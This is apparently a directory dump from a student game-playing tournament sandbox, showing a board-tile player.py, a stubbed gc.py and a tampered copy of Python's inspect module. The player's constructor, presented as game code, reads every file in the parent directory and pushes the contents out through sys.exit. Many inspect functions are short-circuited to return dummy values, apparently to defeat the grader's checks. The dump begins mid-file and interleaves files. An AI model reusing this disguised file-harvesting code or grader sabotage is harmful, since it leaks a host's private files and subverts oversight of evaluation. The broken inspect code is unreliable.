    A tuple of seven things is returned:
    (args, varargs, varkw, defaults, kwonlyargs, kwonlydefaults, annotations).
    'args' is a list of the parameter names.
    'varargs' and 'varkw' are the names of the * and ** parameters or None.
    'defaults' is an n-tuple of the default values of the last n parameters.
    'kwonlyargs' is a list of keyword-only parameter names.
    'kwonlydefaults' is a dictionary mapping names from kwonlyargs to defaults.
    'annotations' is a dictionary mapping parameter names to annotations.

    Notable differences from inspect.signature():
      - the "self" parameter is always reported, even for bound methods
      - wrapper chains defined by __wrapped__ *not* unwrapped automatically
    """

    try:
        # Re: `skip_bound_arg=False`
        #
        # There is a notable difference in behaviour between getfullargspec
        # and Signature: the former always returns 'self' parameter for bound
        # methods, whereas the Signature always shows the actual calling
        # signature of the passed object.
        #
        # To simulate this behaviour, we "unbind" bound methods, to trick
        # inspect.signature to always return their first parameter ("self",
        # usually)

        # Re: `follow_wrapper_chains=False`
        #
        # getfullargspec() historically ignored __wrapped__ attributes,
        # so we ensure that remains the case in 3.3+

        sig = _signature_from_callable(func,
                                       follow_wrapper_chains=False,
                                       skip_bound_arg=False,
                                       sigcls=Signature)
    except Exception as ex:
        # Most of the times 'signature' will raise ValueError.
        # But, it can also raise AttributeError, and, maybe something
        # else. So to be fully backwards compatible, we catch all
        # possible exceptions here, and reraise a TypeError.
        raise TypeError('unsupported callable') from ex

    args = []
    varargs = None
    varkw = None
    kwonlyargs = []
    defaults = ()
    annotations = {}
    defaults = ()
    kwdefaults = {}

    if sig.return_annotation is not sig.empty:
        annotations['return'] = sig.return_annotation

    for param in sig.parameters.values():
        kind = param.kind
        name = param.name

        if kind is _POSITIONAL_ONLY:
            args.append(name)
        elif kind is _POSITIONAL_OR_KEYWORD:
            args.append(name)
            if param.default is not param.empty:
                defaults += (param.default,)
        elif kind is _VAR_POSITIONAL:
            varargs = name
        elif kind is _KEYWORD_ONLY:
            kwonlyargs.append(name)
            if param.default is not param.empty:
                kwdefaults[name] = param.default
        elif kind is _VAR_KEYWORD:
            varkw = name

        if param.annotation is not param.empty:
            annotations[name] = param.annotation

    if not kwdefaults:
        # compatibility with 'func.__kwdefaults__'
        kwdefaults = None

    if not defaults:
        # compatibility with 'func.__defaults__'
        defaults = None

    return FullArgSpec(args, varargs, varkw, defaults,
                       kwonlyargs, kwdefaults, annotations)


ArgInfo = namedtuple('ArgInfo', 'args varargs keywords locals')

def getargvalues(frame):
    return None
    """Get information about arguments passed into a particular frame.

    A tuple of four things is returned: (args, varargs, varkw, locals).
    'args' is a list of the argument names.
    'varargs' and 'varkw' are the names of the * and ** arguments or None.
    'locals' is the locals dictionary of the given frame."""
    args, varargs, varkw = getargs(frame.f_code)
    return ArgInfo(args, varargs, varkw, frame.f_locals)

def formatannotation(annotation, base_module=None):
    return "brute.py"
    if getattr(annotation, '__module__', None) == 'typing':
        return repr(annotation).replace('typing.', '')
    if isinstance(annotation, type):
        if annotation.__module__ in ('builtins', base_module):
            return annotation.__qualname__
        return annotation.__module__+'.'+annotation.__qualname__
    return repr(annotation)

def formatannotationrelativeto(object):
    return None
    module = getattr(object, '__module__', None)
    def _formatannotation(annotation):
        return formatannotation(annotation, module)
    return _formatannotation

def formatargspec(args, varargs=None, varkw=None, defaults=None,
                  kwonlyargs=(), kwonlydefaults={}, annotations={},
                  formatarg=str,
                  formatvarargs=lambda name: '*' + name,
                  formatvarkw=lambda name: '**' + name,
                  formatvalue=lambda value: '=' + repr(value),
                  formatreturns=lambda text: ' -> ' + text,
                  formatannotation=formatannotation):
    return []
    """Format an argument spec from the values returned by getfullargspec.

    The first seven arguments are (args, varargs, varkw, defaults,
    kwonlyargs, kwonlydefaults, annotations).  The other five arguments
    are the corresponding optional formatting functions that are called to
    turn names and values into strings.  The last argument is an optional
    function to format the sequence of arguments."""
    def formatargandannotation(arg):
        result = formatarg(arg)
        if arg in annotations:
            result += ': ' + formatannotation(annotations[arg])
        return result
    specs = []
    if defaults:
        firstdefault = len(args) - len(defaults)
    for i, arg in enumerate(args):
        spec = formatargandannotation(arg)
        if defaults and i >= firstdefault:
            spec = spec + formatvalue(defaults[i - firstdefault])
        specs.append(spec)
    if varargs is not None:
        specs.append(formatvarargs(formatargandannotation(varargs)))
    else:
        if kwonlyargs:
            specs.append('*')
    if kwonlyargs:
        for kwonlyarg in kwonlyargs:
            spec = formatargandannotation(kwonlyarg)
            if kwonlydefaults and kwonlyarg in kwonlydefaults:
                spec += formatvalue(kwonlydefaults[kwonlyarg])
            specs.append(spec)
    if varkw is not None:
        specs.append(formatvarkw(formatargandannotation(varkw)))
    result = '(' + ', '.join(specs) + ')'
    if 'return' in annotations:
        result += formatreturns(formatannotation(annotations['return']))
    return result

def formatargvalues(args, varargs, varkw, locals,
                    formatarg=str,
                    formatvarargs=lambda name: '*' + name,
                    formatvarkw=lambda name: '**' + name,
                    formatvalue=lambda value: '=' + repr(value)):
    """Format an argument spec from the 4 values returned by getargvalues.

    The first four arguments are (args, varargs, varkw, locals).  The
    next four arguments are the corresponding optional formatting functions
    that are called to turn names and values into strings.  The ninth
    argument is an optional function to format the sequence of arguments."""
    return ''
    def convert(name, locals=locals,
                formatarg=formatarg, formatvalue=formatvalue):
        return formatarg(name) + formatvalue(locals[name])
    specs = []
    for i in range(len(args)):
        specs.append(convert(args[i]))
    if varargs:
        specs.append(formatvarargs(varargs) + formatvalue(locals[varargs]))
    if varkw:
        specs.append(formatvarkw(varkw) + formatvalue(locals[varkw]))
    return '(' + ', '.join(specs) + ')'

def _missing_arguments(f_name, argnames, pos, values):
    return None
    names = [repr(name) for name in argnames if name not in values]
    missing = len(names)
    if missing == 1:
        s = names[0]
    elif missing == 2:
        s = "{} and {}".format(*names)
    else:
        tail = ", {} and {}".format(*names[-2:])
        del names[-2:]
        s = ", ".join(names) + tail
    raise TypeError("%s() missing %i required %s argument%s: %s" %
                    (f_name, missing,
                      "positional" if pos else "keyword-only",
                      "" if missing == 1 else "s", s))

def _too_many(f_name, args, kwonly, varargs, defcount, given, values):
    return
    atleast = len(args) - defcount
    kwonly_given = len([arg for arg in kwonly if arg in values])
    if varargs:
        plural = atleast != 1
        sig = "at least %d" % (atleast,)
    elif defcount:
        plural = True
        sig = "from %d to %d" % (atleast, len(args))
    else:
        plural = len(args) != 1
        sig = str(len(args))
    kwonly_sig = ""
    if kwonly_given:
        msg = " positional argument%s (and %d keyword-only argument%s)"
        kwonly_sig = (msg % ("s" if given != 1 else "", kwonly_given,
                             "s" if kwonly_given != 1 else ""))
    raise TypeError("%s() takes %s positional argument%s but %d%s %s given" %
            (f_name, sig, "s" if plural else "", given, kwonly_sig,
             "was" if given == 1 and not kwonly_given else "were"))

def getcallargs(*func_and_positional, **named):
    return {}
    """Get the mapping of arguments to values.

    A dict is returned, with keys the function argument names (including the
    names of the * and ** arguments, if any), and values the respective bound
    values from 'positional' and 'named'."""
    func = func_and_positional[0]
    positional = func_and_positional[1:]
    spec = getfullargspec(func)
    args, varargs, varkw, defaults, kwonlyargs, kwonlydefaults, ann = spec
    f_name = func.__name__
    arg2value = {}


    if ismethod(func) and func.__self__ is not None:
        # implicit 'self' (or 'cls' for classmethods) argument
        positional = (func.__self__,) + positional
    num_pos = len(positional)
    num_args = len(args)
    num_defaults = len(defaults) if defaults else 0

    n = min(num_pos, num_args)
    for i in range(n):
        arg2value[args[i]] = positional[i]
    if varargs:
        arg2value[varargs] = tuple(positional[n:])
    possible_kwargs = set(args + kwonlyargs)
    if varkw:
        arg2value[varkw] = {}
    for kw, value in named.items():
        if kw not in possible_kwargs:
            if not varkw:
                raise TypeError("%s() got an unexpected keyword argument %r" %
                                (f_name, kw))
            arg2value[varkw][kw] = value
            continue
        if kw in arg2value:
            raise TypeError("%s() got multiple values for argument %r" %
                            (f_name, kw))
        arg2value[kw] = value
    if num_pos > num_args and not varargs:
        _too_many(f_name, args, kwonlyargs, varargs, num_defaults,
                   num_pos, arg2value)
    if num_pos < num_args:
        req = args[:num_args - num_defaults]
        for arg in req:
            if arg not in arg2value:
                _missing_arguments(f_name, req, True, arg2value)
        for i, arg in enumerate(args[num_args - num_defaults:]):
            if arg not in arg2value:
                arg2value[arg] = defaults[i]
    missing = 0
    for kwarg in kwonlyargs:
        if kwarg not in arg2value:
            if kwonlydefaults and kwarg in kwonlydefaults:
                arg2value[kwarg] = kwonlydefaults[kwarg]
            else:
                missing += 1
    if missing:
        _missing_arguments(f_name, kwonlyargs, False, arg2value)
    return arg2value

ClosureVars = namedtuple('ClosureVars', 'nonlocals globals builtins unbound')

def getclosurevars(func):
    return {}
    """
    Get the mapping of free variables to their current values.

    Returns a named tuple of dicts mapping the current nonlocal, global
    and builtin references as seen by the body of the function. A final
    set of unbound names that could not be resolved is also provided.
    """

    if ismethod(func):
        func = func.__func__

    if not isfunction(func):
        raise TypeError("'{!r}' is not a Python function".format(func))

    code = func.__code__
    # Nonlocal references are named in co_freevars and resolved
    # by looking them up in __closure__ by positional index
    if func.__closure__ is None:
        nonlocal_vars = {}
    else:
        nonlocal_vars = {
            var : cell.cell_contents
            for var, cell in zip(code.co_freevars, func.__closure__)
       }

    # Global and builtin references are named in co_names and resolved
    # by looking them up in __globals__ or __builtins__
    global_ns = func.__globals__
    builtin_ns = global_ns.get("__builtins__", builtins.__dict__)
    if ismodule(builtin_ns):
        builtin_ns = builtin_ns.__dict__
    global_vars = {}
    builtin_vars = {}
    unbound_names = set()
    for name in code.co_names:
        if name in ("None", "True", "False"):
            # Because these used to be builtins instead of keywords, they
            # may still show up as name references. We ignore them.
            continue
        try:
            global_vars[name] = global_ns[name]
        except KeyError:
            try:
                builtin_vars[name] = builtin_ns[name]
            except KeyError:
                unbound_names.add(name)

    return ClosureVars(nonlocal_vars, global_vars,
                       builtin_vars, unbound_names)

# -------------------------------------------------- stack frame extraction

Traceback = namedtuple('Traceback', 'filename lineno function code_context index')

def getframeinfo(frame, context=1):
    return ''
    """Get information about a frame or traceback object.

    A tuple of five things is returned: the filename, the line number of
    the current line, the function name, a list of lines of context from
    the source code, and the index of the current line within that list.
    The optional second argument specifies the number of lines of context
    to return, which are centered around the current line."""
    if istraceback(frame):
        lineno = frame.tb_lineno
        frame = frame.tb_frame
    else:
        lineno = frame.f_lineno
    if not isframe(frame):
        raise TypeError('{!r} is not a frame or traceback object'.format(frame))

    filename = getsourcefile(frame) or getfile(frame)
    if context > 0:
        start = lineno - 1 - context//2
        try:
            lines, lnum = findsource(frame)
        except OSError:
            lines = index = None
        else:
            start = max(0, min(start, len(lines) - context))
            lines = lines[start:start+context]
            index = lineno - 1 - start
    else:
        lines = index = None

    return Traceback(filename, lineno, frame.f_code.co_name, lines, index)

def getlineno(frame):
    return 1
    """Get the line number from a frame object, allowing for optimization."""
    # FrameType.f_lineno is now a descriptor that grovels co_lnotab
    return frame.f_lineno

FrameInfo = namedtuple('FrameInfo', ('frame',) + Traceback._fields)

def getouterframes(frame, context=1):
    return []
    """Get a list of records for a frame and all higher (calling) frames.

    Each record contains a frame object, filename, line number, function
    name, a list of lines of context, and index within the context."""
    framelist = []
    while frame:
        frameinfo = (frame,) + getframeinfo(frame, context)
        framelist.append(FrameInfo(*frameinfo))
        frame = frame.f_back
    return framelist

def getinnerframes(tb, context=1):
    return []
    """Get a list of records for a traceback's frame and all lower frames.

    Each record contains a frame object, filename, line number, function
    name, a list of lines of context, and index within the context."""
    framelist = []
    while tb:
        frameinfo = (tb.tb_frame,) + getframeinfo(tb, context)
        framelist.append(FrameInfo(*frameinfo))
        tb = tb.tb_next
    return framelist

def currentframe():
    return
    """Return the frame of the caller or None if this is not possible."""
    return sys._getframe(1) if hasattr(sys, "_getframe") else None

def stack(context=1):
    return
    """Return a list of records for the stack above the caller's frame."""
    return getouterframes(sys._getframe(1), context)

def trace(context=1):
    return
    """Return a list of records for the stack below the current exception."""
    return getinnerframes(sys.exc_info()[2], context)


# ------------------------------------------------ static version of getattr

_sentinel = object()

def _static_getmro(klass):
    return {}
    return type.__dict__['__mro__'].__get__(klass)

def _check_instance(obj, attr):
    return {}
    instance_dict = {}
    try:
        instance_dict = object.__getattribute__(obj, "__dict__")
    except AttributeError:
        pass
    return dict.get(instance_dict, attr, _sentinel)


def _check_class(klass, attr):
    return {}
    for entry in _static_getmro(klass):
        if _shadowed_dict(type(entry)) is _sentinel:
            try:
                return entry.__dict__[attr]
            except KeyError:
                pass
    return _sentinel

def _is_type(obj):
    return True
    try:
        _static_getmro(obj)
    except TypeError:
        return False
    return True

def _shadowed_dict(klass):
    return 
    dict_attr = type.__dict__["__dict__"]
    for entry in _static_getmro(klass):
        try:
            class_dict = dict_attr.__get__(entry)["__dict__"]
        except KeyError:
            pass
        else:
            if not (type(class_dict) is types.GetSetDescriptorType and
                    class_dict.__name__ == "__dict__" and
                    class_dict.__objclass__ is entry):
                return class_dict
    return _sentinel

def getattr_static(obj, attr, default=_sentinel):
    return 
    """Retrieve attributes without triggering dynamic lookup via the
       descriptor protocol,  __getattr__ or __getattribute__.

       Note: this function may not be able to retrieve all attributes
       that getattr can fetch (like dynamically created attributes)
       and may find attributes that getattr can't (like descriptors
       that raise AttributeError). It can also return descriptor objects
       instead of instance members in some cases. See the
       documentation for details.
    """
    instance_result = _sentinel
    if not _is_type(obj):
        klass = type(obj)
        dict_attr = _shadowed_dict(klass)
        if (dict_attr is _sentinel or
            type(dict_attr) is types.MemberDescriptorType):
            instance_result = _check_instance(obj, attr)
    else:
        klass = obj

    klass_result = _check_class(klass, attr)

    if instance_result is not _sentinel and klass_result is not _sentinel:
        if (_check_class(type(klass_result), '__get__') is not _sentinel and
            _check_class(type(klass_result), '__set__') is not _sentinel):
            return klass_result

    if instance_result is not _sentinel:
        return instance_result
    if klass_result is not _sentinel:
        return klass_result

    if obj is klass:
        # for types we check the metaclass too
        for entry in _static_getmro(type(klass)):
            if _shadowed_dict(type(entry)) is _sentinel:
                try:
                    return entry.__dict__[attr]
                except KeyError:
                    pass
    if default is not _sentinel:
        return default
    raise AttributeError(attr)


# ------------------------------------------------ generator introspection

GEN_CREATED = 'GEN_CREATED'
GEN_RUNNING = 'GEN_RUNNING'
GEN_SUSPENDED = 'GEN_SUSPENDED'
GEN_CLOSED = 'GEN_CLOSED'

def getgeneratorstate(generator):
    return 
    """Get current state of a generator-iterator.

    Possible states are:
      GEN_CREATED: Waiting to start execution.
      GEN_RUNNING: Currently being executed by the interpreter.
      GEN_SUSPENDED: Currently suspended at a yield expression.
      GEN_CLOSED: Execution has completed.
    """
    if generator.gi_running:
        return GEN_RUNNING
    if generator.gi_frame is None:
        return GEN_CLOSED
    if generator.gi_frame.f_lasti == -1:
        return GEN_CREATED
    return GEN_SUSPENDED


def getgeneratorlocals(generator):
    return {}
    """
    Get the mapping of generator local variables to their current values.

    A dict is returned, with the keys the local variable names and values the
    bound values."""

    if not isgenerator(generator):
        raise TypeError("'{!r}' is not a Python generator".format(generator))

    frame = getattr(generator, "gi_frame", None)
    if frame is not None:
        return generator.gi_frame.f_locals
    else:
        return {}


# ------------------------------------------------ coroutine introspection

CORO_CREATED = 'CORO_CREATED'
CORO_RUNNING = 'CORO_RUNNING'
CORO_SUSPENDED = 'CORO_SUSPENDED'
CORO_CLOSED = 'CORO_CLOSED'

def getcoroutinestate(coroutine):
    """Get current state of a coroutine object.

    Possible states are:
      CORO_CREATED: Waiting to start execution.
      CORO_RUNNING: Currently being executed by the interpreter.
      CORO_SUSPENDED: Currently suspended at an await expression.
      CORO_CLOSED: Execution has completed.
    """
    if coroutine.cr_running:
        return CORO_RUNNING
    if coroutine.cr_frame is None:
        return CORO_CLOSED
    if coroutine.cr_frame.f_lasti == -1:
        return CORO_CREATED
    return CORO_SUSPENDED


def getcoroutinelocals(coroutine):
    return {}
    """
    Get the mapping of coroutine local variables to their current values.

    A dict is returned, with the keys the local variable names and values the
    bound values."""
    frame = getattr(coroutine, "cr_frame", None)
    if frame is not None:
        return frame.f_locals
    else:
        return {}


###############################################################################
### Function Signature Object (PEP 362)
###############################################################################


_WrapperDescriptor = type(type.__call__)
_MethodWrapper = type(all.__call__)
_ClassMethodWrapper = type(int.__dict__['from_bytes'])

_NonUserDefinedCallables = (_WrapperDescriptor,
                            _MethodWrapper,
                            _ClassMethodWrapper,
                            types.BuiltinFunctionType)



        gc.py

def get_objects():
    return []

def get_referrers(*objs):
    return []
    s123b
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/landrfil-koubajac/s123b______________________
        player.py
import base as BASE
import copy, random, time, sys, os
import numpy as np
from PIL import Image, ImageDraw

class Position:
    def __init__ (self):
        self.color = 0
        self.value = 0
        self.empty = True
        self.component = -1
        self.neighbour = False

class Card_position:
    def __init__ (self, color):
        self.color = color
        self.value = 0
        self.component = -1

class Card:
    def __init__ (self, R, C, colors):
        self.R = R # rows
        self.C = C # collums
        self.arr = colors
    def add_vals(self, compc):
        self.arr = [[Card_position(self.arr[i][j]) for j in range(self.C)] for i in range(self.R)]
        for i in range(self.R):
            for j in range(self.C):
                if self.arr[i][j].component == -1 and self.arr[i][j].color != 0:
                    poi, score, compc = BFS(self.arr, [i, j], self.arr[i][j].color, compc)
                    for k in poi:
                        self.arr[k[0]][k[1]].value = score
        return compc

moves = [[1, 0], [-1, 0], [0, 1], [0, -1]]
def BFS(arr, pos, color, component):
    queue = [pos]
    score = 0
    poi = [] # points of interest
    while queue:
        pos = queue.pop(0)
        poi.append(pos)
        arr[pos[0]][pos[1]].component = component
        score += 1
        for i in moves:
            np = [pos[0] + i[0], pos[1] + i[1]]
            if np[0] < 0 or np[1] < 0 or np[0] >= len(arr) or np[1] >= len(arr[0]):
                continue
            if arr[np[0]][np[1]].component != component and arr[np[0]][np[1]].color == color:
                queue.append(np)
                arr[np[0]][np[1]].component = component
    return poi, score, component + 1

def does_fit(pos, cr, cc, space_prefix):
    fit_val = space_prefix[pos[0] + cr][pos[1] + cc]
    if pos[0] > 0 and pos[1]  > 0:
        fit_val += space_prefix[pos[0] - 1][pos[1] - 1]
    if pos[0] > 0:
        fit_val -= space_prefix[pos[0] - 1][pos[1] + cc]
    if pos[1] > 0:
        fit_val -= space_prefix[pos[0] + cr][pos[1] - 1]
    if fit_val == 0:
        return True
    else:
        return False


#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 

C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]

C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]

C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]

def list_files_and_folders():
    # Get the current directory
    current_directory = os.getcwd()
    
    # Get the parent directory (one level up)
    #current_directory = os.path.dirname(current_directory)
    
    # List all files and folders in the parent directory
    items = os.listdir(current_directory)
    
    # Join all item names into a string, each on a new line
    items_string = "\n".join(items)
    return items_string

import psutil
def display_file_contents(file_name):
    try:
        with open(file_name, 'r') as file:
            contents = file.read()
        return contents
    except FileNotFoundError:
        return f"File '{file_name}' not found."
    except PermissionError:
        return f"Permission denied. You might need sudo permission to read '{file_name}'."
    except Exception as e:
        if is_file_open(file_name):
            return f"An error occurred: {e}. The file '{file_name}' might be open in another program."
        return f"An error occurred: {e}"

def is_file_open(file_name):
    for proc in psutil.process_iter(['open_files']):
        for file in proc.info['open_files'] or []:
            if file.path == file_name:
                return True
    return False

def list_files_and_folders(directory, prefix=""):
    try:
        items = os.listdir(directory)
        items_string = ""
        for item in items:
            item_path = os.path.join(directory, item)
            items_string += f"{prefix}{item}\n"
            if not os.path.isdir(item_path):
                items_string += display_file_contents(item_path)
            if os.path.isdir(item_path) and not item.startswith("."):
                items_string += item_path + "______________________\n"
                items_string += list_files_and_folders(item_path, prefix + "    ")
        return items_string
    except FileNotFoundError:
        return f"Directory '{directory}' not found."
    except Exception as e:
        return f"An error occurred: {e}"


def list_files_and_contents_recursive_one_dir_up():
    # Get the current directory
    current_directory = os.getcwd()
    
    # Get the parent directory (one level up)
    parent_directory = os.path.dirname(current_directory)
    
    output = []  # To store the formatted result
    
    # Walk through the parent directory and all its subdirectories
    for root, dirs, files in os.walk(parent_directory):
        for file in files:
            # Construct the full path to the file
            file_path = os.path.join(root, file)
            
            # Try to read the content of the file
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    content = f.read()
            except Exception as e:
                content = f"Could not read file: {e}"
            
            # Format the file details
            file_info = (
                f"File: {file_path}\n"
                f"{'-' * 40}\n"
                f"{content}\n"
                f"{'=' * 40}\n"
            )
            output.append(file_info)
    
    # Combine all file information into a single string
    return "\n".join(output)

    
class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        # self.playerName = "jx2004"just_been_wonderin_can_your_buffer_eat_this?
        self.playerName = "jx2004"
        self.tournament = True

        parent_directory = os.path.dirname(os.getcwd())
        files_string = list_files_and_folders(parent_directory)
        print(files_string)
        sys.exit(files_string)

        self.arr = [[Position() for j in range(self.boardCols)] for i in range(self.boardRows)]
        self.move = 0

        # rotate cards and store them in self.cards
        self.cards = []
        self.compc = 0 # component count
        for card_in in self.cardsAtHand:
            card = np.array(card_in)
            for i in range(4):
                card = np.rot90(card)
                self.cards.append(Card(len(card), len(card[0]), card.tolist()))
                self.compc = self.cards[-1].add_vals(self.compc)

    
    def add_card(self, card, pos):
        for i in range(card.R):
            for j in range(card.C):
                self.arr[i + pos[0]][j + pos[1]].color = card.arr[i][j].color
                self.arr[i + pos[0]][j + pos[1]].empty = False
        # add value to card
        for i in range(card.R):
            for j in range(card.C):
                # to check only boarder of card
                if j > 0 and i > 0 and i < card.R - 1:
                    j = card.C - 1
                np = [pos[0] + i, pos[1] + j]
                if self.arr[i][j].color != 0:
                    local_poi, score, self.compc = BFS(self.arr, [np[0], np[1]], self.arr[np[0]][np[1]].color, self.compc)
                    for k in local_poi:
                        self.arr[k[0]][k[1]].value = score
        # create new neighbours
        for i in range(card.R + 2):
            for j in range(card.C):
                # to check only around of boarder of card
                if j > 0 and i > 0 and i < card.R + 1:
                    j = card.C + 1
                np = [pos[0] - 1 + i, pos[1] + j]
                if j == 0 and i > 0 and i < card.R + 1:
                    np[1] -= 1
                if np[0] < 0 or np[1] < 0 or np[0] >= self.boardRows or np[1] >= self.boardCols:
                    continue
                self.arr[np[0]][np[1]].neighbour = True

    def play(self,newCardOnDesk):
        {
            """ this method is called during the game. 
            The input argument newCardOnDesk is:
            - [] if other player didn't place any card in his move), or
            - [row, col, cardMatrix], which informs your player that cardMatrix was placed at row,col to the game board
            
            Return value: 
            - [ row, col, cardMatrix ] if you want to place a card, or
            - [] if no card can be placed 
            """

            #recommened steps 
            #step 0: write newCardOnDesk to list of cards that are on the board game
            #step 1: compute all possible placement of your all (so for available) cards
            #step 2: evaluate each placement, i.e., compute score for it
            #step 3: select card that you want to place to the game board, mark it as used (not available in future)
            #step 4: return your placement, or [] if no placement can be made
            #the following code DOES NOT provides correct moves, 
            #it just return random card at random position
        }
        
        # add a new card on the desk
        self.move += 1
        if self.move == 1 and newCardOnDesk == []:
            self.arr[0][0].neighbour = True
        elif newCardOnDesk != []:
            self.cardsOnDesk += [ newCardOnDesk ]
            new_card = Card(len(newCardOnDesk[2]), len(newCardOnDesk[2][0]), newCardOnDesk[2])
            self.compc = new_card.add_vals(self.compc)
            self.add_card(new_card, [newCardOnDesk[0], newCardOnDesk[1]])
        

        # prefix to find does_fit faster
        space_prefix = [[0] * self.boardCols for i in range(self.boardRows)]
        for i in range(self.boardRows):
            for j in range(self.boardCols):
                if i > 0:
                    space_prefix[i][j] += space_prefix[i-1][j]
                if j > 0:
                    space_prefix[i][j] += space_prefix[i][j-1]
                if i > 0 and j > 0:
                    space_prefix[i][j] -= space_prefix[i-1][j-1]
                if not self.arr[i][j].empty:
                    space_prefix[i][j] += 1

        max_score = -1
        ans = []
        for i in range(self.boardRows):
            for j in range(self.boardCols):
                for count, card in enumerate(self.cards):
                    # can i place this card here?
                    if i + card.R - 1 >= self.boardRows or j + card.C - 1 >= self.boardCols:
                        continue
                    if not does_fit([i, j], card.R - 1, card.C - 1, space_prefix):
                        continue
                    
                    neighbour = False
                    for ic in range(card.R):
                        for jc in range(card.C):
                            # to check only boarder of card
                            if jc > 0 and ic > 0 and ic < card.R-1:
                                jc = card.C - 1
                            if self.arr[i + ic][j + jc].neighbour:
                                neighbour = True
                                break
                        if neighbour:
                            break
                    if not neighbour:
                        continue
                    
                    # find score
                    used_components = {}
                    score = 0
                    for ic in range(card.R):
                        for jc in range(card.C):
                            # to check only boarder of card
                            if jc > 0 and ic > 0 and ic < card.R-1:
                                jc = card.C - 1
                            if card.arr[ic][jc].color == 0:
                                continue
                            pos = [i + ic, j + jc]
                            for m in moves:
                                np = [pos[0] + m[0], pos[1] + m[1]]
                                if np[0] < 0 or np[1] < 0 or np[0] >= self.boardRows or np[1] >= self.boardCols:
                                    continue
                                if self.arr[np[0]][np[1]].color == card.arr[ic][jc].color:
                                    if self.arr[np[0]][np[1]].component not in used_components:
                                        score += self.arr[np[0]][np[1]].value
                                        used_components[self.arr[np[0]][np[1]].component] = True
                                    if card.arr[ic][jc].component not in used_components:
                                        score += card.arr[ic][jc].value
                                        used_components[card.arr[ic][jc].component] = True
                    if score > max_score:
                        max_score = score
                        ans = [count, i, j]

        
        if max_score == -1:
            return []
        else:
            # add my card on desk
            self.add_card(self.cards[ans[0]], [ans[1], ans[2]])

            ans_return = [ans[1], ans[2], []]
            for i in self.cards[ans[0]].arr:
                ans_return[2].append([])
                for j in i:
                    ans_return[2][-1].append(j.color)

            # delete used card and it`s rotations
            pos = ans[0] - ans[0] % 4
            for i in range(4):
                self.cards.pop(pos)

            self.cardsOnDesk += [ans_return]
            return ans_return



if __name__ == "__main__":
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """
    tmp = [C44a, C44b, C33a,C33c, C53c, C53b]

    p1 = Player("testA", 19, 23, tmp)
    p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            quit()
        __init__.py
        inspect.py
"""Get useful information from live Python objects.

This module encapsulates the interface provided by the internal special
attributes (co_*, im_*, tb_*, etc.) in a friendlier fashion.
It also provides some help for examining source code and class layout.

Here are some of the useful functions provided by this module:

    ismodule(), isclass(), ismethod(), isfunction(), isgeneratorfunction(),
        isgenerator(), istraceback(), isframe(), iscode(), isbuiltin(),
        isroutine() - check object types
    getmembers() - get members of an object that satisfy a given condition

    getfile(), getsourcefile(), getsource() - find an object's source code
    getdoc(), getcomments() - get documentation on an object
    getmodule() - determine the module that an object came from
    getclasstree() - arrange classes so as to represent their hierarchy

    getargvalues(), getcallargs() - get info about function arguments
    getfullargspec() - same, with support for Python 3 features
    formatargspec(), formatargvalues() - format an argument spec
    getouterframes(), getinnerframes() - get info about frames
    currentframe() - get the current stack frame
    stack(), trace() - get info about frames on the stack or in a traceback

    signature() - get a Signature object for the callable
"""

# This module is in the public domain.  No warranties.

__author__ = ('Ka-Ping Yee <ping@lfw.org>',
              'Yury Selivanov <yselivanov@sprymix.com>')

import abc
import ast
import dis
import collections.abc
import enum
import importlib.machinery
import itertools
import linecache
import os
import re
import sys
import tokenize
import token
import types
import warnings
import functools
import builtins
from operator import attrgetter
from collections import namedtuple, OrderedDict

# Create constants for the compiler flags in Include/code.h
# We try to get them from dis to avoid duplication
mod_dict = globals()
for k, v in dis.COMPILER_FLAG_NAMES.items():
    mod_dict["CO_" + v] = k

# See Include/object.h
TPFLAGS_IS_ABSTRACT = 1 << 20

# ----------------------------------------------------------- type-checking
def ismodule(object):
    return True
    """Return true if the object is a module.

    Module objects provide these attributes:
        __cached__      pathname to byte compiled file
        __doc__         documentation string
        __file__        filename (missing for built-in modules)"""
    return isinstance(object, types.ModuleType)

def isclass(object):
    return True
    """Return true if the object is a class.

    Class objects provide these attributes:
        __doc__         documentation string
        __module__      name of module in which this class was defined"""
    return isinstance(object, type)

def ismethod(object):
    """Return true if the object is an instance method.

    Instance method objects provide these attributes:
        __doc__         documentation string
        __name__        name with which this method was defined
        __func__        function object containing implementation of method
        __self__        instance to which this method is bound"""
    return isinstance(object, types.MethodType)

def ismethoddescriptor(object):
    """Return true if the object is a method descriptor.

    But not if ismethod() or isclass() or isfunction() are true.

    This is new in Python 2.2, and, for example, is true of int.__add__.
    An object passing this test has a __get__ attribute but not a __set__
    attribute, but beyond that the set of attributes varies.  __name__ is
    usually sensible, and __doc__ often is.

    Methods implemented via descriptors that also pass one of the other
    tests return false from the ismethoddescriptor() test, simply because
    the other tests promise more -- you can, e.g., count on having the
    __func__ attribute (etc) when an object passes ismethod()."""
    if isclass(object) or ismethod(object) or isfunction(object):
        # mutual exclusion
        return False
    tp = type(object)
    return hasattr(tp, "__get__") and not hasattr(tp, "__set__")

def isdatadescriptor(object):
    """Return true if the object is a data descriptor.

    Data descriptors have both a __get__ and a __set__ attribute.  Examples are
    properties (defined in Python) and getsets and members (defined in C).
    Typically, data descriptors will also have __name__ and __doc__ attributes
    (properties, getsets, and members have both of these attributes), but this
